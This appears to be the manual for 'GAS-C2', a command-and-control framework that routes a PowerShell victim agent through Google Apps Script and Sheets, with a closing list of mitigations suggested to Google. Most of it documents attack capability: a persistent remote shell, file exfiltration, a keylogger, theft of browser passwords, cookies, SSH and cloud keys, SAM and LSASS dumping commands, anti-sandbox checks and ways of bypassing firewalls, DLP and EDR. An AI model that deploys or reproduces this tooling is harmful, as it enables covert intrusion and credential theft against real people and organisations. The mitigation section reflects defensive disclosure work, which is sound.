GAS-C2 — Google Apps Script Command & Control

v1.1.0

How it works

GAS-C2 uses Google Apps Script as the C2 server and Google Sheets as its database — zero owned infrastructure. All traffic passes through script.google.com, a universally trusted domain.

Panel (operator) --[HTTPS]--> script.google.com --[Sheets API]--> Google Sheets
Agent (victim) --[HTTPS]--> script.google.com --[poll/result]--> Google Sheets

1. Panel writes XOR-encrypted command to Sheets via ?action=queue
2. Agent polls ?action=poll every 8s (+ random jitter)
3. GAS returns the encrypted command from the sheet
4. Agent XOR-decrypts, executes, XOR-encrypts the output
5. Agent POSTs the result to GAS
6. Panel fetches ?action=results every 5s, decrypts and displays

Panel parameters (sidebar)

Field Value Description
C2 Endpoint https://script.google.com/macros/s/...ID.../exec Deployed GAS Web App URL. From Apps Script → Deploy → Manage Deployments.
Token gas-c2-vrp-2026 Shared secret between panel and agent. Sent with every request. Must match Code.gs (CONFIG.TOKEN) and agent.ps1 (-Token).
Target * or agent UUID * = broadcast to all agents. Specific UUID = sends the command only to that agent.

agent.ps1 parameters

powershell -ep bypass -File agent.ps1 [-C2Url URL] [-PollInterval 8] [-Token SECRET] [-XorKey KEY]
Parameter Default Description
-C2Url hardcoded in script GAS Web App URL. Can also be changed live with set-c2 <url>.
-PollInterval 8 (seconds) How often the agent polls for commands. A random jitter (0–4s) is added per cycle. Changeable live with set-interval <s>.
-Token gas-c2-vrp-2026 Authentication secret for the C2. Sent in every GET request to GAS.
-XorKey GAS_VRP_2026_K XOR key for obfuscating commands and outputs in Sheets. Must be identical in the panel (XOR_KEY in JS) and Code.gs.

Stateful shell (persistent runspace)

shell <powershell>Executes PS code in the persistent runspace. cd, variables, loaded modules — all persist between commands.
cd <path>Changes the current directory in the runspace. Persists for subsequent commands.
pwdReturns the current directory from the runspace.
set-var <name> <val>Sets a variable in the runspace. Ex: set-var apikey abc123 → $apikey available in subsequent shell commands.
get-var <name>Reads a variable's value from the runspace.
reset-shellFully resets the runspace — clears all variables and loaded modules.
cmd <command>Executes via cmd.exe /c. No persistent state.

Filesystem & file transfer

ls [path]Lists the directory. No path = current directory from runspace.
cat <path>Reads a file's contents (alias: type).
upload <path>Exfiltrates a file. Small files = single result. Large files = automatic chunked transfer, reassembled in panel and auto-downloaded in the browser.
download <url> [dest]Downloads a file from the internet to the victim machine. No dest = saves to %TEMP%.

Background jobs (async)

bg <command>Launches command in background. Agent remains free for other commands. Result is auto-posted to C2 when done (cmd_id: bg-J1, bg-J2, etc.).
jobsLists background jobs with status (RUNNING/DONE), elapsed time and command.
job <J1>Manually retrieves a completed job's output by its ID.

Keylogger

keylog stopStops the keylogger.
keylog dumpReturns and clears the accumulated buffer (keystrokes with window titles and timestamps).

Clipboard watcher

Credential exfiltration

browser-credsCopies Chrome/Edge/Brave Login Data SQLite + Local State (contains DPAPI-encrypted AES key). Upload both; decrypt offline: python3 decrypt_chrome_passwords.py.
browser-cookiesCopies Chrome/Edge/Brave Cookies SQLite from all profiles. Session cookies for Google, O365, etc. Decrypt with Local State key.
ssh-keysSearches %USERPROFILE%\.ssh and all user profiles for SSH private keys (id_rsa, id_ed25519, id_ecdsa, *.pem, *.ppk).
cloud-keysAWS (~/.aws/credentials), Azure (~/.azure/), GCP (~/.config/gcloud), Docker (~/.docker/config.json), Kubernetes (~/.kube/config), plus environment variables matching key/token/secret patterns.
sam-dumpAdmin required. Exports SAM + SYSTEM registry hives. Extract NTLM hashes offline: impacket-secretsdump -sam sam.hive -system system.hive LOCAL.
lsass-dumpAdmin required. MiniDump via comsvcs.dll (no external tools). Parse: pypykatz lsa minidump lsass.dmp or mimikatz sekurlsa::minidump.

Persistence & agent control

XOR encryption & obfuscation

All commands and outputs are XOR-encrypted + Base64 before being stored in Google Sheets. Google cannot see the plaintext.

Key: configurable via -XorKey (agent) and XOR_KEY constant (panel JS)
Flow: Panel XOR-encrypts command → GAS stores encrypted → Agent decrypts → executes → XOR-encrypts output → GAS stores encrypted → Panel decrypts on display

Anti-sandbox

The agent checks at startup whether it is running in an analysis environment. If a sandbox is detected, it silently exits with exit 0.

Running processes < 28Sandboxes have few running processes
Suspicious hostnamesandbox, malware, virus, cuckoo, anyrun, hybrid, analysis, vmware
Uptime < 4 minutesSandboxes boot the machine only for scanning
Suspicious usernamesandbox, malware, virus, cuckoo, tester, vmuser

Why it bypasses enterprise security

Control Status Reason
Enterprise firewall BYPASSED script.google.com is universally allowlisted
Proxy / SSL inspection BYPASSED Standard HTTPS to Google, certificate-pinned
DLP solutions BYPASSED XOR-encrypted data, trusted Google domain
Threat intel blocklists BYPASSED Zero owned infrastructure (no attacker IPs or domains)
EDR network rules BYPASSED Google traffic is typically excluded from inspection
Attacker attribution EVADED Attacker has no owned infrastructure
User-Agent / headers SPOOFED Chrome 123 UA + Referer: docs.google.com — traffic looks like a normal browser

Suggested mitigations for Google

Mandatory authenticationRemove the "Anyone" option for Web Apps — require at minimum Google Sign-In
Rate limitingLimit requests per account / per hour on public Web Apps
Sandbox UrlFetchAppRestrict outbound requests from public Web Apps (SSRF vector)
Anomaly detectionFlag accounts with high-volume automated Web App requests
CORS enforcementRestrict Access-Control-Allow-Origin on GAS responses
Audit loggingLog all Web App invocations with caller metadata
